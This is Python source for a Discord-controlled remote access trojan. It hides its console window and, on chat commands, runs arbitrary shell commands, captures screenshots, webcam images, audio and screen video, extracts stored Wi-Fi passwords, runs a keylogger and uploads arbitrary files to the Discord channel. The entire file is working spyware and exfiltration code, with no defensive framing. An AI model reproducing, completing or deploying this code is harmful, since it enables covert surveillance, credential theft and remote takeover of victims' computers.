import discord
from discord.ext import commands
import subprocess
import pyautogui
import cv2
import numpy as np
import requests
import pyaudio
import wave
from io import BytesIO
from PIL import Image
from pynput import keyboard
import logging
import threading
import ctypes
import sys
import os
import mss
import time

# Hide the console window on Windows
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=".", intents=intents)

# This will store the bot token, keep it secure!
TOKEN = ''

# Set up logging for keylogging
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s: %(message)s")

# Variable to control keylogger state
keylogger_active = False
keylistener = None


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')


# Command to execute system commands
@bot.command(name="exec")
async def exec_command(ctx, *, cmd: str):
    if ctx.author.guild_permissions.administrator:  # Only allow admins to execute commands
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            await ctx.send(f"Command output:\n{result.decode()}")
        except subprocess.CalledProcessError as e:
            await ctx.send(f"Error executing command: {e}")
    else:
        await ctx.send("You do not have permission to execute this command.")


# Command to take a screenshot
@bot.command(name="screenshot")
async def screenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")

        with open("screenshot.png", "rb") as file:
            await ctx.send("Here's the screenshot:", file=discord.File(file))
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {e}")


# Command to capture webcam feed (captures an image)
@bot.command(name="webcam")
async def webcam(ctx):
    try:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            await ctx.send("Could not access the webcam.")
            return

        ret, frame = cap.read()
        cap.release()

        if ret:
            # Convert image to bytes
            _, img_bytes = cv2.imencode('.png', frame)
            img = Image.open(BytesIO(img_bytes.tobytes()))
            img.save('webcam.png')

            with open('webcam.png', 'rb') as file:
                await ctx.send("Here's the webcam snapshot:", file=discord.File(file))
        else:
            await ctx.send("Failed to capture webcam image.")
    except Exception as e:
        await ctx.send(f"Error accessing webcam: {e}")


# Command to record audio for 10 seconds and send as a .wav file
@bot.command(name="record")
async def record(ctx):
    try:
        # Set parameters for recording
        FORMAT = pyaudio.paInt16  # Audio format
        CHANNELS = 1  # Mono audio
        RATE = 44100  # Sampling rate
        CHUNK = 1024  # Size of each audio chunk
        RECORD_SECONDS = 10  # Duration of recording
        FILENAME = "audio_recording.wav"  # Output file name

        # Initialize the PyAudio instance
        p = pyaudio.PyAudio()

        # Open stream for recording
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        await ctx.send("Recording...")

        frames = []

        # Record audio for the specified duration
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        # Stop the stream and terminate the PyAudio instance
        await ctx.send("Recording finished.")
        stream.stop_stream()
        stream.close()
        p.terminate()

        # Save the recorded audio to a file
        with wave.open(FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))

        # Send the audio file to Discord
        with open(FILENAME, 'rb') as file:
            await ctx.send("Here's your recorded audio:", file=discord.File(file))

    except Exception as e:
        await ctx.send(f"Error recording audio: {e}")


# Command to grab Wi-Fi profile information
@bot.command(name="grab_wifi")
async def grab_wifi(ctx, profile_name: str):
    if ctx.author.guild_permissions.administrator:  # Only allow admins to execute this command
        try:
            # Command to retrieve Wi-Fi profile details including the password (if available)
            cmd = f'netsh wlan show profile name="{profile_name}" key=clear'
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()

            # Check if password exists in the profile information
            if "Key Content" in result:
                # Extract the Wi-Fi password
                start = result.find("Key Content") + len("Key Content") + 2
                end = result.find("\n", start)
                password = result[start:end].strip()
                await ctx.send(f"Wi-Fi Profile: {profile_name}\nPassword: {password}")
            else:
                await ctx.send(f"No password found for Wi-Fi profile: {profile_name}")
        except subprocess.CalledProcessError as e:
            await ctx.send(f"Error fetching Wi-Fi profile: {e}")
    else:
        await ctx.send("You do not have permission to execute this command.")


# Keylogger functions
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when the escape key is pressed
        return False


def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


@bot.command(name="key_start")
async def key_start(ctx):
    global keylogger_active, keylistener
    if keylogger_active:
        await ctx.send("Keylogger is already running.")
        return

    await ctx.send("Starting keylogger...")
    keylogger_active = True
    keylistener = threading.Thread(target=start_keylogger)
    keylistener.start()


@bot.command(name="key_stop")
async def key_stop(ctx):
    global keylogger_active, keylistener
    if not keylogger_active:
        await ctx.send("Keylogger is not running.")
        return

    await ctx.send("Stopping keylogger...")
    keylogger_active = False
    keylistener.join()


@bot.command(name="key_dump")
async def key_dump(ctx):
    try:
        with open("keylog.txt", "r") as file:
            logs = file.read()
        if logs:
            await ctx.send("Keylog dump:\n" + logs)
        else:
            await ctx.send("No keylogs recorded.")
    except Exception as e:
        await ctx.send(f"Error reading keylog: {e}")


# Command to download and send a file from the bot's system
@bot.command(name="download")
async def download(ctx, file_name: str):
    try:
        # Define the path to the file to download
        file_path = file_name  # Adjust path if necessary

        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                await ctx.send(f"Here is your file: {file_name}", file=discord.File(file))
        else:
            await ctx.send(f"File '{file_name}' not found.")
    except Exception as e:
        await ctx.send(f"Error occurred: {e}")


# Command to stream the screen for 10 seconds
@bot.command(name="stream")
async def stream(ctx):
    try:
        duration = 10  # Duration in seconds
        filename = "stream_output.mp4"

        # Set up screen recording
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Use the first monitor
            fourcc = cv2.VideoWriter_fourcc(*"mp4v")
            fps = 20
            out = cv2.VideoWriter(filename, fourcc, fps, (monitor["width"], monitor["height"]))

            start_time = time.time()
            while time.time() - start_time < duration:
                img = np.array(sct.grab(monitor))
                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                out.write(frame)

            out.release()

        # Send the recorded video
        with open(filename, "rb") as file:
            await ctx.send("Here's the screen recording:", file=discord.File(file))

        # Clean up
        os.remove(filename)
    except Exception as e:
        await ctx.send(f"Error recording the screen: {e}")


bot.run(TOKEN)
